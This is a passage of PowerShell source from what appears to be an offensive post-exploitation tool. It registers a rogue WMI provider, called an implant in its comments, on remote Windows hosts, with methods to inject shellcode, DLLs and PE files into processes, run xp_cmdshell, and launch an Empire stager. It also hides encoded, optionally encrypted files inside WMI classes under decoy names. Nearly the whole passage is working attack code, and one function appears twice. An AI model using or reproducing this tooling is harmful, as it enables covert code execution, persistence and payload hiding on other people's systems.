        (New-WMIMethodParameter -Direction In -Property Command -CimType String)
    )
    Write-Verbose "Creating RunXpCmdShell"
    Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName RunXpCmdShell -MethodInParameters $parameters
}

################################################################################
################################################################################
Function local:Add-WMIMethodInjectShellCode {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass][ref]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property ShellCodeString -CimType String),
        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
    )
    Write-Verbose "Creating InjectShellCode"
    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectShellCode -MethodInParameters $parameters
}

################################################################################
################################################################################
Function local:Add-WMIMethodInjectShellCodeWMFIFSB4 {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass][ref]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property WmiClass -CimType String),
        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
    )
    Write-Verbose "Creating InjectShellCodeWMFIFSB4"
    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectShellCodeWMFIFSB4 -MethodInParameters $parameters
}

################################################################################
################################################################################
Function local:Add-WMIMethodInjectShellCodeWMFIFSB4 {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass][ref]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property WmiClass -CimType String),
        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
    )
    Write-Verbose "Creating InjectShellCodeWMFIFSB4"
    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectShellCodeWMFIFSB4 -MethodInParameters $parameters
}

################################################################################
################################################################################
Function local:Add-WMIMethodInjectDll {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property Library -CimType String),
        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
    )
    Write-Verbose "Creating InjectDll"
    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectDll -MethodInParameters $parameters
}

################################################################################
################################################################################
Function local:Add-WMIMethodInjectDllWMIFS {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property WmiClass -CimType String),
        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
    )
    Write-Verbose "Creating InjectDllWMIFS"
    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectDllWMIFS -MethodInParameters $parameters
}

################################################################################
################################################################################
Function local:Add-WMIMethodInjectPeFile {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
        (New-WMIMethodParameter -Direction In -Property Parameters -CimType String),
        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
    )
    Write-Verbose "Creating InjectPeFile"
    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectPeFile -MethodInParameters $parameters

}

################################################################################
################################################################################
Function local:Add-WMIMethodInjectPeString {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property PeString -CimType String),
        (New-WMIMethodParameter -Direction In -Property Parameters -CimType String),
        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
    )
    Write-Verbose "Creating InjectPeString"
    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectPeString -MethodInParameters $parameters

}

################################################################################
################################################################################
Function local:Add-WMIMethodInjectPeWMIFS {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property WmiClass -CimType String),
        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
        (New-WMIMethodParameter -Direction In -Property Parameters -CimType String),
        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
    )
    Write-Verbose "Creating InjectPeWMIFS"
    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectPeWMIFS -MethodInParameters $parameters

}

################################################################################
################################################################################
Function local:Add-WMIMethodEmpire {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property Server -CimType String),
        (New-WMIMethodParameter -Direction In -Property StagingKey -CimType String),
        (New-WMIMethodParameter -Direction In -Property Language -CimType String)
    )
    Write-Verbose "Creating Empire"
    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName Empire -MethodInParameters $parameters

}
#endregion

#region MethodCreationFuctions
################################################################################
# Returns an object that contains the parameter information to be iterated through
################################################################################
Function local:New-WMIMethodParameter {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Method to add.")] 
            [ValidateSet("In", "Out")]
            [String]$Direction,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [String]$Property,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [System.Management.CimType]$CimType
    )
     Return New-Object psobject -Property @{
        Direction = $Direction
        Property = $Property 
        CimType = $CimType
    }
}

################################################################################
# Add parameter to a method using standard qualifiers
################################################################################
Function local:Add-WMIProviderClassMethod {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass][ref]$Class,
        [Parameter(Mandatory=$True, HelpMessage="Name of method to add.")] 
            [String]$MethodName,
        [Parameter(Mandatory=$True, HelpMessage="Input parameters for methods.")] 
            [Object[]]$MethodInParameters,
        [Parameter(Mandatory=$False, HelpMessage="Output parameters, e.g. ReturnValues.")] 
            [Object[]]$MethodOutParameters,
        [Parameter(Mandatory=$False, HelpMessage="Do not add an index qualifer. This is typically used with the ReturnValue out property.")] 
            [String]$NoIndex = $False
    )
    Begin {
        $InParameters = New-Parameters -Direction In
        $OutParameters = New-Parameters -Direction Out
    } Process {
        $Index = 0
        ################################################################################
        # Iterate through in parameters
        ################################################################################
        $MethodInParameters | ForEach-Object {
            Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction $_.Direction -Index $Index -Property $_.Property -CimType $_.CimType
            $Index++
        }

        ################################################################################
        # Iterate through out parameters, create one if not specified
        ################################################################################
        if( -not $MethodOutParameters) {
            $MethodOutParameters = @($(New-WMIMethodParameter -Direction Out -Property "ReturnValue" -CimType String))
            $NoIndex = $True
        }
        $MethodOutParameters | ForEach-Object {
            if ($NoIndex) {
                Add-WMIProviderClassProperty -Parameters ([ref] $OutParameters) -Direction $_.Direction -Property $_.Property -CimType $_.CimType
            } else {
                Add-WMIProviderClassProperty -Parameters ([ref] $OutParameters) -Direction $_.Direction -Index $Index -Property $_.Property -CimType $_.CimType
                $Index++
            }
        }
    } End {
       $Class.Methods.Add($MethodName, $(New-ManagementBaseObject -Parameter $InParameters), $(New-ManagementBaseObject -Parameter $OutParameters))
       $Class.Methods[$MethodName].Qualifiers.Add("static", $True)
       $Class.Methods[$MethodName].Qualifiers.Add("implemented", $True)
    }
}

################################################################################
# Add property to class with standard qualifiers
################################################################################
Function local:Add-WMIProviderClassProperty {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Parameter to add property to.")] 
            [Object][ref]$Parameters,
        [Parameter(Mandatory=$True, HelpMessage="Property to add.")] 
            [Object]$Property,
        [Parameter(Mandatory=$True, HelpMessage=".")]
            [ValidateSet("In", "Out")] 
            [String]$Direction,
        [Parameter(Mandatory=$False, HelpMessage="The 0 indexed property to be added. Not requred for return value.")] 
            [Int]$Index,
        [Parameter(Mandatory=$False, HelpMessage=".")] 
            [Object]$MappingStrings,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [System.Management.CimType]$CimType
    )

    $Parameters.Properties.Add($Property, $CimType, $false)
    $Parameters.Properties[$Property].Qualifiers.Add($Direction, $true)
    if ($Property.ToLower() -ne "returnvalue") {
        $Parameters.Properties[$Property].Qualifiers.Add("ID", $Index)
    }
    if ($MappingString)
    {
        $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
    }
}

################################################################################
# Derive a new parameter from __PARAMETERS, defaults to root\cimv2
################################################################################
Function local:New-Parameters {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Parameter direction, input or output.")]
            [ValidateSet("In", "Out")] 
            [String]$Direction,
        [Parameter(Mandatory=$False, HelpMessage="Class to derive parameter from defaults to ROOT\cimv2.")]
            [String]$Class = "ROOT\cimv2"
    )
    $__PARAMETERS = New-Object System.Management.ManagementClass($Class, "__PARAMETERS", $null)
    $Parameters = $__PARAMETERS.Clone()
    $Parameters.Qualifiers.Add($Direction, $True)
    return $Parameters
}

################################################################################
# Convert a parameter to a WMI deployable instance of a management base object
################################################################################
Function local:New-ManagementBaseObject {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [Object]$Parameters
    )
    $TempPtr = [System.IntPtr]$Parameters
    $DotNetPath = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
    $SystemManagement = [System.Reflection.Assembly]::LoadFile($DotNetPath+"System.Management.dll")

    $IWbemClassObjectFreeThreaded = $SystemManagement.GetType("System.Management.IWbemClassObjectFreeThreaded")
    $IWbemClassObjectFreeThreaded_ctor = $IWbemClassObjectFreeThreaded.GetConstructors()[0]
    $IWbemClassObjectFreeThreadedInstance = $IWbemClassObjectFreeThreaded_ctor.Invoke($TempPtr)

    $ManagementBaseObject = $SystemManagement.GetType("System.Management.ManagementBaseObject")
    $ManagementBaseObject_ctor = $ManagementBaseObject.GetConstructors([Reflection.BindingFlags] "NonPublic, Instance")[1]
    $ManagementBaseObjectInstance = $ManagementBaseObject_ctor.Invoke($IWbemClassObjectFreeThreadedInstance)

    Return $ManagementBaseObjectInstance
}

################################################################################
# 
################################################################################
Function local:Invoke-ExtensionProviderSetup {
    [CmdletBinding()]
    Param(
    	[Parameter(Mandatory=$True, HelpMessage="Address of the system to connect to. Defaults to localhost.")] 
            [String]$ComputerName,
	    [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [System.Management.ManagementScope]$Scope,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [String]$Guid,
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [String]$Provider,
        [Parameter(Mandatory=$False, HelpMessage=".")] 
            [String]$uri = "file:///",
        [Parameter(Mandatory=$false, HelpMessage="Provider clr version.")]
            [ValidateSet ("v2.0.50727", "v4.0.30319")]
            [string]$RuntimeVersion = "v4.0.30319",
        [Parameter(Mandatory=$True, HelpMessage=".")] 
            [String]$RemoteLibraryLocation,
        [Parameter(Mandatory=$false, HelpMessage=".")]
            [string]$HostingModel = "LocalSystemHost:CLR"
    )

    ################################################################################
    # Create the WMI_extension class
    ################################################################################
    Write-Verbose "Creating WMI_extension"
    $__Win32Provider = New-Object System.Management.ManagementClass($Scope, "__Win32Provider", $null); 
    $WMI_extension = $__Win32Provider.Derive("WMI_extension")   
    $WMI_extension.Properties['Name'].Value = $null
    $WMI_extension.Properties['ClsId'].Value = "{$Guid}"
    $WMI_extension.Properties['Version'].Value = 1
    $WMI_extension.Properties['HostingModel'].Value = "Decoupled:COM"
    $WMI_extension.Properties['SecurityDescriptor'].Value = $null
    $WMI_extension.Properties.Add("AssemblyName", [System.Management.CimType]::String, $false)
    $WMI_extension.Properties.Add("AssemblyPath", [System.Management.CimType]::String, $false)
    $WMI_extension.Properties.Add("CLRVersion", [System.Management.CimType]::String, $false)
    $null = $WMI_extension.put()

    ################################################################################
    # Create the Win32_Implant instance in WMI_extension
    # https://msdn.microsoft.com/en-us/library/aa392783(v=vs.85).aspx
    ################################################################################
    Write-Verbose "Registering $ProviderDisplayName as a WMI_extension Instance"
    $WMI_extension_instance = Set-WmiInstance -Class WMI_extension -Arguments @{
        AssemblyName = $Provider;
        AssemblyPath = $uri + $($RemoteLibraryLocation -replace "\\","/");
        CLRVersion   = $RuntimeVersion;
        CLSID        = "{$Guid}"
        HostingModel = $HostingModel;
        Name         = $Provider;
    } -ComputerName $ComputerName -Credential $Credential

    ################################################################################
    # Create the __InstanceProviderRegistration for wmi_extension instance
    ################################################################################
    Write-Verbose "Registering $ClassName as an Instance Provider"
    $__InstanceProviderRegistration = Set-WmiInstance -Class __InstanceProviderRegistration -Arguments @{
        Provider = $WMI_extension_instance;
        SupportsGet = $True;
        SupportsPut = $True;
        SupportsDelete = $True;
        SupportsEnumeration = $True;
    } -ComputerName $ComputerName -Credential $Credential

    ################################################################################
    # Create the __MethodProviderRegistration for wmi_extension instance
    ################################################################################
    Write-Verbose "Registering $ClassName as a Method Provider"
    $__MethodProviderRegistration = Set-WmiInstance -Class __MethodProviderRegistration -Arguments @{
        Provider = $WMI_extension_instance;
    } -ComputerName $ComputerName -Credential $Credential
}
#endregion
#endregion

#region WMIFS
################################################################################
# Create a new WMI Class
################################################################################
Function New-WMIFSClass {
<#
	.SYNOPSIS
    	Creates a new WMI class to be used to store files
    .PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
	.PARAMETER ClassName
	    Name of class to create.
	.EXAMPLE
	    New-WMIClass -ClassName WMIFS
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName=".",
        
        [Parameter(Mandatory=$False, HelpMessage="Username used to authenticate to remote WMI service..")]
            [string]$Username,
        [Parameter(Mandatory=$False, HelpMessage="Password used to authenticate to remote WMI service.")]
            [string]$Password,
        [Parameter(Mandatory=$False, HelpMessage="Password stored as a SecureString object to authenticate to remote WMI service.")]
            [SecureString]$SecurePassword,
        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$False, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$False, HelpMessage="The namespace in which to create the WMI class.")]
            [string]$NameSpace = 'ROOT\cimv2'
    )
    Begin {
        $ManagementClass = New-WMIConnection -ComputerName $ComputerName -Username $Username -Password $Password -SecurePassword $SecurePassword -Credential $Credential -NameSpace $NameSpace
    } Process {
        $ManagementClass["__CLASS"] = $ClassName; 

        $ManagementClass.Qualifiers.Add("Static", $true)

        $ManagementClass.Properties.Add("FileStore", [System.Management.CimType]::String, $false)
        $ManagementClass.Properties["FileStore"].Qualifiers.Add("Key", $true)
        $ManagementClass.Properties["FileStore"].Qualifiers.Add("MaxLen", $([int32]::MaxValue - 1))

        $ManagementClass.Properties.Add("FileName", [System.Management.CimType]::String, $false)
        $ManagementClass.Properties["FileName"].Qualifiers.Add("Key", $true)

        $ManagementClass.Properties.Add("Index", [System.Management.CimType]::String, $false)
        $ManagementClass.Properties["Index"].Qualifiers.Add("Key", $true)
    } End {
        $ManagementClass.Put()
    }
}

################################################################################
# Convert the input file to Base64
# https://github.com/samratashok/nishang/blob/master/Utility/ExetoText.ps1
################################################################################
Function ConvertTo-Base64 {
<#
	.SYNOPSIS
	    Converts a file to a Base64 encoded string by reading it in as raw bytes
	.PARAMETER FileName
	    Path to the File to convert
    .PARAMETER Inject
        Prepare file for memory injection, dont treat file as unicode.
	.EXAMPLE
	    $EncodedText = ConvertTo-Base64 -FileName "cmd.exe" -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Path to File.")]
            [string]$FileName,
        [Parameter(Mandatory=$False, HelpMessage="Prepare file for memory injection, dont treat file as unicode.")]
            [validateset($True, $False)]
            [bool]$Inject = $False
    )
    Begin {
    } Process {
        Write-Verbose "Reading $FileName"
        #[byte[]]$File = Get-Content -Encoding Byte -Path $FileName
        [byte[]]$File = [System.IO.File]::ReadAllBytes($FileName)
        Write-Verbose "Encoding $FileName"
        if (-not $Inject) {
            $Bytes = [System.Text.Encoding]::Unicode.GetBytes($File)
        } else {
            $Bytes = $File
        }
        $EncodedText = [Convert]::ToBase64String($Bytes)
        Write-Verbose "Finished Encoding $FileName"
    } End {
        Write-Output $EncodedText
    }
}

################################################################################
################################################################################
Function local:Add-Entry {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$Index,
        [Parameter(Mandatory=$true, HelpMessage=".")]
            [string]$SubString
    )
    $object = New-Object PSObject -Property @{
        Index = New-Object System.String([String]::Empty);
        SubString = New-Object System.String([String]::Empty);
    }
    $object.Index = $Index;
    $object.SubString = $SubString;
    return $object;
}

################################################################################
# Insert the Base64 Encoded File into the WMI Class
################################################################################
Function Invoke-InsertFileThreaded {
<#
	.SYNOPSIS
	    Slices a string into defined lengths and inserts it into a WMI class.
	.PARAMETER EncodedText
	    The Base64 encoded text to insert.
	.PARAMETER FileName
	    Name to identify the file in WMI. This value can be random.
	.PARAMETER ClassName
	    Name of the WMI class to insert into.
    .PARAMETER StrLen
        Allowed String Length.
    .PARAMETER Encrypt
        Encrypt the input file. This increase the file size by approximately 4x.
    .PARAMETER Key
        Optional Encryption Key.
    .PARAMETER Credential
        Credential object used authenticate to remote WMI service.
    .PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
	.EXAMPLE
	    Invoke-InsertFile -EncodedText $EncodedText -FileName "definately_not_cmd.exe" -ClassName WMIFS -StrLen $length -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, 
            HelpMessage="Encoded Text to Insert",
            ValueFromPipeline=$true,
            ValueFromPipelineByPropertyName=$true)]
            [string]$EncodedText,
        [Parameter(Mandatory=$true, HelpMessage="Name to identify the file in WMI.")]
            [string]$FileName,
        [Parameter(Mandatory=$true, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Allowed String Length")]
            [string]$StrLen = 8000,
        [Parameter(Mandatory=$false, HelpMessage="Encrypt the input file. This increase the file size by approximately 4x")]
            [switch]$Encrypt,
        [Parameter(Mandatory=$false, HelpMessage="Optional Encryption Key.")]
            [ValidateLength(16,16)]
            [string]$Key,
        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [object]$Credential,
        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
            [string]$ComputerName = "Address of the system to connect to. Defaults to localhost."
    )
    Begin {
        $index = 0
        if ($Encrypt) {
            #Rough estimate
            $StrLen /= 4.2
            $StrLen = [Math]::Floor($StrLen)
        }
        $SectionCount = [Math]::Ceiling($EncodedText.Length/$StrLen)
        $Sections = New-Object System.Collections.Generic.List[System.Management.Automation.PSObject]
    } Process {
        
        Write-Verbose "Creating Section 0 - $SectionCount" 

        For ($i = 0; $i -lt $EncodedText.Length; $i += $strlen) {
            if ($($i + $strlen) -le $EncodedText.Length) {
                [string]$substring = $EncodedText.Substring($i, $strlen)
            } else {
                [string]$substring = $EncodedText.Substring($i, $($EncodedText.Length - $i))
            }
            if ($Encrypt) {
                if ($key) {
                    $substring = ConvertTo-EncryptedText -PlaintextString $substring -Key $Key
                } else {
                    $substring = ConvertTo-EncryptedText -PlaintextString $substring
                }
            }
            $Sections.Add($(Add-Entry -Index $index -SubString $substring));
            $index++;
        }

        $ScriptBlock = {
            Write-Verbose ("Inserting Section: {0} ({1}...)" -f ($_.Index, $_.SubString.Substring(0,10)))
            $null = Set-WmiInstance -Class $ClassName -ComputerName $ComputerName -Arguments @{
                FileStore = $_.SubString;
                FileName = $FileName; 
                Index = $_.Index;
            } -Credential $Credential
        }
        $Sections | Invoke-Parallel -ImportVariables -ScriptBlock $ScriptBlock
    } End {
    }
}

################################################################################
# Pull the file back from WMI
# (Less) Ugly Hack to get it working
# an ORDER BY would nice
################################################################################
Function Invoke-RetrieveFile {
<#
	.SYNOPSIS
	    Retrieves a file from WMI identified by the FileName
	.PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
    .PARAMETER Credential
        Credential object used authenticate to remote WMI service.
    .PARAMETER FileName
	    Name of the file in WMI.
	.PARAMETER ClassName
	    Name of the WMI class to retrieve from.
    .PARAMETER Decrypt
        Decrypt the Retrieved File.
    .PARAMETER Key
        Optional Decryption Key.
	.EXAMPLE
	    $File = Invoke-RetrieveFile -FileName "cmd.exe" -ClassName WMIFS -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [object]$Credential,
        [Parameter(Mandatory=$true, HelpMessage="Name of File to Retrieve")]
            [string]$FileName,
        [Parameter(Mandatory=$false, HelpMessage="Name of Class to Create.")]
            [string]$ClassName = 'WMIFS',
        [Parameter(Mandatory=$false, HelpMessage="Decrypt the Retrieved File.")]
            [switch]$Decrypt,
        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key.")]
            [ValidateLength(16,16)]
            [string]$Key
    )
    Begin {
    } Process {
        $query = Get-WmiObject -Query "SELECT * FROM $ClassName WHERE FileName LIKE '$FileName'" -ComputerName $ComputerName -Credential $Credential
        $stringBuilder = New-Object System.Text.StringBuilder
        $query | Select-Object @{Name='Index'; Expression={[int]$_.Index}},FileStore | Sort-Object Index | 
        ForEach-Object { 
            Write-Verbose ("Reading Section {0} ({1}...)" -f @($_.Index, $_.FileStore.SubString(0,10)))
            if ($Decrypt) {
                if ($key) {
                    $null = $stringBuilder.Append([String]$(ConvertFrom-EncryptedText -EncryptedString $_.FileStore -Key $Key))
                } else {
                    $null = $stringBuilder.Append([String]$(ConvertFrom-EncryptedText -EncryptedString $_.FileStore))
                }
            } else {
                $null = $stringBuilder.Append([String]$_.FileStore)
            }
        }
    } End {
        Write-Output $stringBuilder.ToString()
    }
}

################################################################################
# Covert the file back from Base64 to bytes
# https://github.com/samratashok/nishang/blob/master/Utility/TexttoExe.ps1
################################################################################
Function ConvertFrom-Base64 {
<#
	.SYNOPSIS
	    Converts a File from Base64 back to raw bytes
	.PARAMETER EncodedText
	    The Base64 encoded text to decode.
	.PARAMETER WriteToDisk
	    Switch to write file back to disk
	.PARAMETER FileName
	    Name of file to write out to.
	.EXAMPLE
	    ConvertFrom-Base64 -EncodedText $EncodedText -WriteToDisk -FileName 'C:\calc.exe' -Verbose
	
	$File = ConvertFrom-Base64 -EncodedText $EncodedText -Verbose
	Set-Content -Path "NothingToSeeHere.txt" -Value $File -Encoding Byte
	Or consider using Invoke-ReflectivePEInjection here...
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Text to Decode",
            ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
            [string]$EncodedText,
        [Parameter(Mandatory=$false, HelpMessage="Name of File to Convert")]
            [switch]$WriteToDisk,
		[Parameter(Mandatory=$false, HelpMessage="Name of File to Write Out")]
            [string]$FileName = "NothingToSeeHere.txt"
    )
    Begin {
    } Process {
        Write-Verbose "Decoding File"
        $DecodedText = [System.Convert]::FromBase64String($EncodedText)
        Write-Verbose "Finished Decoding File"
        #This doesn't seem nessessary
        [byte[]]$Output = ([System.Text.Encoding]::Unicode.GetString($DecodedText)) -split ' '
    } End {
		if ($WriteToDisk) {
			Write-Verbose "Writing File to Disk as $FileName"
			Set-Content -Path $FileName -Value $Output -Encoding Byte
		} else {
			Write-Output $Output
		}
    }
}

################################################################################
# Encrypt the string before inserting
################################################################################
Function ConvertTo-EncryptedText{
<#
	.SYNOPSIS
	    
	.PARAMETER PlaintextString
	    String of Text to Encrypt.
	.PARAMETER Key
	    Optional Encryption Key.
	.EXAMPLE
	
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="String of Text to Encrypt.")]
            [string]$PlaintextString,
        [Parameter(Mandatory=$false, HelpMessage="Optional Encryption Key.")]
            [string]$Key
    )
    Begin {
        $SecureString = ConvertTo-SecureString -String $PlaintextString -AsPlainText -Force
    } Process {
        if ($key) {
            $EncryptedString = ConvertFrom-SecureString -SecureString $SecureString -Key $Key
        } else {
            $EncryptedString = ConvertFrom-SecureString -SecureString $SecureString
        }
    } End {
        $EncryptedString
    }
}

################################################################################
# Decrypt the string after retrieval
################################################################################
Function ConvertFrom-EncryptedText{
<#
	.SYNOPSIS
	
	.PARAMETER EncryptedString
	    String of Text to Decrypt.
	.PARAMETER Key
	    Optional Decryption Key.
	.EXAMPLE
	
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="String of Text to Decrypt.")]
            [string]$EncryptedString,
        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key.")]
            [string]$Key
    )
    Begin {

    } Process {
        if ($key) {
            $SecureString = ConvertTo-SecureString -String $EncryptedString -Key $Key
        } else {
            $SecureString = ConvertTo-SecureString -String $EncryptedString
        }
        $PlaintextString = (New-Object System.Net.NetworkCredential([string]::Empty, $SecureString)).password
    } End {
        $PlaintextString
    }
}
#endregion

function local:Invoke-Parallel {
    <#
    .SYNOPSIS
        Function to control parallel processing using runspaces
    .DESCRIPTION
        Function to control parallel processing using runspaces
            Note that each runspace will not have access to variables and commands loaded in your session or in other runspaces by default.
            This behaviour can be changed with parameters.
    .PARAMETER ScriptFile
        File to run against all input objects.  Must include parameter to take in the input object, or use $args.  Optionally, include parameter to take in parameter.  Example: C:\script.ps1
    .PARAMETER ScriptBlock
        Scriptblock to run against all computers.
        You may use $Using:<Variable> language in PowerShell 3 and later.
            The parameter block is added for you, allowing behaviour similar to foreach-object:
                Refer to the input object as $_.
                Refer to the parameter parameter as $parameter
    .PARAMETER InputObject
        Run script against these specified objects.
    .PARAMETER Parameter
        This object is passed to every script block.  You can use it to pass information to the script block; for example, the path to a logging folder
            Reference this object as $parameter if using the scriptblock parameterset.
    .PARAMETER ImportVariables
        If specified, get user session variables and add them to the initial session state
    .PARAMETER ImportModules
        If specified, get loaded modules and pssnapins, add them to the initial session state
    .PARAMETER Throttle
        Maximum number of threads to run at a single time.
    .PARAMETER SleepTimer
        Milliseconds to sleep after checking for completed runspaces and in a few other spots.  I would not recommend dropping below 200 or increasing above 500
    .PARAMETER RunspaceTimeout
        Maximum time in seconds a single thread can run.  If execution of your code takes longer than this, it is disposed.  Default: 0 (seconds)
        WARNING:  Using this parameter requires that maxQueue be set to throttle (it will be by default) for accurate timing.  Details here:
        http://gallery.technet.microsoft.com/Run-Parallel-Parallel-377fd430
    .PARAMETER NoCloseOnTimeout
        Do not dispose of timed out tasks or attempt to close the runspace if threads have timed out. This will prevent the script from hanging in certain situations where threads become non-responsive, at the expense of leaking memory within the PowerShell host.
    .PARAMETER MaxQueue
        Maximum number of powershell instances to add to runspace pool.  If this is higher than $throttle, $timeout will be inaccurate
        If this is equal or less than throttle, there will be a performance impact
        The default value is $throttle times 3, if $runspaceTimeout is not specified
        The default value is $throttle, if $runspaceTimeout is specified
    .PARAMETER LogFile
        Path to a file where we can log results, including run time for each thread, whether it completes, completes with errors, or times out.
    .PARAMETER AppendLog
        Append to existing log
    .PARAMETER Quiet
        Disable progress bar
    .EXAMPLE
        Each example uses Test-ForPacs.ps1 which includes the following code:
            param($computer)
            if(test-connection $computer -count 1 -quiet -BufferSize 16){
                $object = [pscustomobject] @{
                    Computer=$computer;
                    Available=1;
                    Kodak=$(
                        if((test-path "\\$computer\c$\users\public\desktop\Kodak Direct View Pacs.url") -or (test-path "\\$computer\c$\documents and settings\all users\desktop\Kodak Direct View Pacs.url") ){"1"}else{"0"}
                    )
                }
            }
            else{
                $object = [pscustomobject] @{
                    Computer=$computer;
                    Available=0;
                    Kodak="NA"
                }
            }
            $object
    .EXAMPLE
        Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject $(get-content C:\pcs.txt) -runspaceTimeout 10 -throttle 10
            Pulls list of PCs from C:\pcs.txt,
            Runs Test-ForPacs against each
            If any query takes longer than 10 seconds, it is disposed
            Only run 10 threads at a time
    .EXAMPLE
        Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject c-is-ts-91, c-is-ts-95
            Runs against c-is-ts-91, c-is-ts-95 (-computername)
            Runs Test-ForPacs against each
    .EXAMPLE
        $stuff = [pscustomobject] @{
            ContentFile = "windows\system32\drivers\etc\hosts"
            Logfile = "C:\temp\log.txt"
        }
        $computers | Invoke-Parallel -parameter $stuff {
            $contentFile = join-path "\\$_\c$" $parameter.contentfile
            Get-Content $contentFile |
                set-content $parameter.logfile
        }
        This example uses the parameter argument.  This parameter is a single object.  To pass multiple items into the script block, we create a custom object (using a PowerShell v3 language) with properties we want to pass in.
